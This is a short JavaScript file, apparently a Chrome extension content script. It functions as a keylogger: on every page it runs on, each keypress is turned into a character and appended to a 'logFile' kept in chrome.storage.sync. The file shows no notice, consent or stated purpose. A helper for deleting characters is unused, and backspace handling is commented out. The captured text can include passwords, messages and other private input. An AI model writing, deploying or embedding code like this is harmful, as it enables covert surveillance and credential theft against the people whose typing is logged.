var stringToWrite = "";

function writeStringToStorage(s) {
	
	chrome.storage.sync.get("logFile", function(items) {
		
	    if (!chrome.runtime.error) {
			
			var oldString;
			
			if (items.logFile)
				oldString = items.logFile;
			else
				oldString = "";
			
			var newString = oldString + s;
			chrome.storage.sync.set({"logFile": newString});
	    }
	});
		
	chrome.storage.sync.get("logFile", function(items) {
	    if (!chrome.runtime.error) {
	      console.log(items.logFile);
	    }
	  });
	
}

function deleteCharFromStorage() {
	chrome.storage.sync.get("logFile", function(items) {
		
	    if (!chrome.runtime.error) {
			
			if (items.logFile) {
				var oldString = items.logFile;
				var newString = oldString.slice(0, -1);
				chrome.storage.sync.set({"logFile": newString});
			}
		}
	});
}

window.onload = function() {
	writeStringToStorage("<br>");
}

document.onkeypress = function(evt) {
	
	// Get the key
	evt = evt || window.event;
	var charCode = evt.keyCode || evt.which;
	var charStr = String.fromCharCode(charCode);

	// Prepare to write
	stringToWrite += charStr;
	
	// Write to chrome.storage
	writeStringToStorage(stringToWrite);
	stringToWrite = "";
}

/*document.addEventListener("keydown", KeyCheck);  //or however you are calling your method
function KeyCheck(event)
{
   var KeyID = event.keyCode;
   switch(KeyID)
   {
		case 8: case 46:
			alert("backspace");
			break; 

		default:
			break;
   }
}*/
